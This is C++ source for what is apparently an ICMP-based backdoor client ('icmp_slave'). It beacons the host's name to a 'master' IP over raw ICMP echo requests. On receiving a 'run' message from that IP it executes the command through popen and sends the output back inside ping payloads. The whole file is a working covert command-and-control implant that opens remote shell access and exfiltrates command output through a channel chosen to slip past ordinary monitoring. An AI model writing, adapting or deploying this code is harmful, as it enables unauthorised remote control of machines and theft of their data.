#include <iostream>
#include <cstring>
#include <cstdio>
#include <string>
#include <vector>
#include <sstream>

#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>

static char hostname[256];

static uint16_t checksum(void *vdata, size_t size)
{
    uint8_t *data = (uint8_t *)vdata;

    // Initialise the accumulator.
    uint64_t acc = 0xffff;

    // Handle any partial block at the start of the data.
    unsigned int offset = ((uintptr_t)data) & 3;
    if (offset)
    {
        size_t count = 4 - offset;
        if (count > size)
            count = size;
        uint32_t word = 0;
        memcpy(offset + (char *)&word, data, count);
        acc += ntohl(word);
        data += count;
        size -= count;
    }

    // Handle any complete 32-bit blocks.
    uint8_t *data_end = data + (size & ~3);
    while (data != data_end)
    {
        uint32_t word;
        memcpy(&word, data, 4);
        acc += ntohl(word);
        data += 4;
    }
    size &= 3;

    // Handle any partial block at the end of the data.
    if (size)
    {
        uint32_t word = 0;
        memcpy(&word, data, size);
        acc += ntohl(word);
    }

    // Handle deferred carries.
    acc = (acc & 0xffffffff) + (acc >> 32);
    while (acc >> 16)
    {
        acc = (acc & 0xffff) + (acc >> 16);
    }

    // If the data began at an odd byte address
    // then reverse the byte order to compensate.
    if (offset & 1)
    {
        acc = ((acc & 0xff00) >> 8) | ((acc & 0x00ff) << 8);
    }

    // Return the checksum in network byte order.
    return ~acc;
}

long send_ping(int sockfd, const std::string &dst, uint8_t *buf, size_t size)
{
    uint8_t out[1024];
    icmphdr *icmp = (icmphdr *)out;
    icmp->icmp_type = 8;
    icmp->icmp_code = 0;
    icmp->icmp_cksum = 0;

    if (buf && size > 0)
    {
        memcpy(&out[sizeof(icmphdr) + 4], buf, size);
    }

    icmp->icmp_cksum = htons(checksum(out, sizeof(icmphdr) + 4 + size));

    sockaddr_in addr_;
    addr_.sin_family = AF_INET;
    addr_.sin_port = htons(0);
    addr_.sin_addr.s_addr = inet_addr(dst.c_str());

    long ret;
    if ((ret = sendto(sockfd, out, sizeof(icmphdr) + 4 + size, 0, (sockaddr *)&addr_, sizeof(addr_))) == -1)
    {
        perror("sendto");
    }
    return ret;
}

long receive_ping(int sockfd, std::string &src, uint8_t *buf, size_t size)
{
    long ret = 0;
    uint8_t in[1024];
    if ((ret = read(sockfd, in, sizeof(in))) == -1)
    {
        return -1;
    }

    ip *ip_ = (ip *)in;
    if (ret > sizeof(ip))
    {
        char *src_ = inet_ntoa(ip_->ip_src);
        src = src_;

        if (ret > sizeof(ip) + sizeof(icmphdr))
        {
            if (buf && size > 0)
            {
                memcpy(buf, in + sizeof(ip) + sizeof(icmphdr) + 4, ret - sizeof(ip) - sizeof(icmphdr) - 4);
            }
        }
    }

    return ret - sizeof(ip) - sizeof(icmphdr) - 4;
}

std::vector<std::string> split_input(std::string &input)
{
    std::vector<std::string> ret;
    std::istringstream iss(input);
    for (std::string s; iss >> s;)
    {
        ret.push_back(s);
    }
    return ret;
}

void parse_command(int sockfd, const std::string &dst, uint8_t *buf, size_t size)
{
    if (size == 0)
        return;

    char *cmd_str_ = (char *)buf;
    std::string cmd_str(cmd_str_, size);
    auto split = split_input(cmd_str);

    std::string command;
    for (int i = 1; i < split.size(); i++)
    {
        command.append(split.at(i));
        if (i != split.size() - 1)
        {
            command.append(" ");
        }
    }

    if (split.at(0).compare("run") == 0)
    {
        std::cout << "Running: " << command << "\n";
        FILE *fp = popen(command.c_str(), "r");
        uint8_t out[512];
        if (fp == NULL)
        {
            return;
        }

        size_t nbytes;
        do
        {
            nbytes = fread(out, 1, sizeof(out), fp);
            send_ping(sockfd, dst, out, nbytes);
        } while (nbytes == sizeof(out));

        send_ping(sockfd, dst, NULL, 0);

        pclose(fp);
    }
}

void usage(int exit_code)
{
    puts("usage: icmp_slave [-h] interface dst_ip\n");
    exit(exit_code);
}

int main(int argc, char **argv)
{
    // Check args
    if (argc < 3)
    {
        usage(-1);
    }

    if (strcmp(argv[1], "-h") == 0)
    {
        usage(0);
    }

    gethostname(hostname, sizeof(hostname));

    // Master IP address that box will continuously ping.
    char *opt = argv[1];
    char *dest_ip = argv[2];

    // Create the raw socket.
    int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd == -1)
    {
        perror("socket");
        return -1;
    }

    const size_t len = strnlen(opt, IFNAMSIZ);
    if (len == IFNAMSIZ) {
        std::fputs("Too long iface name", stderr);
        exit(-1);
    }

    setsockopt(sockfd, SOL_SOCKET, IP_RECVIF, opt, len);

    // Start the listener loop.
    while (1)
    {
        // Send a ICMP echo request.
        std::string beacon = "(beacon) ";
        beacon.append(hostname);
        send_ping(sockfd, dest_ip, (uint8_t *)beacon.c_str(), beacon.size() + 1);

        uint8_t buf[1024];
        std::string src_ip;
        long nbytes = receive_ping(sockfd, src_ip, buf, sizeof(buf));
        if (src_ip == dest_ip)
        {
            parse_command(sockfd, dest_ip, buf, nbytes);
        }

        usleep(1000000);
    }

    return 0;
}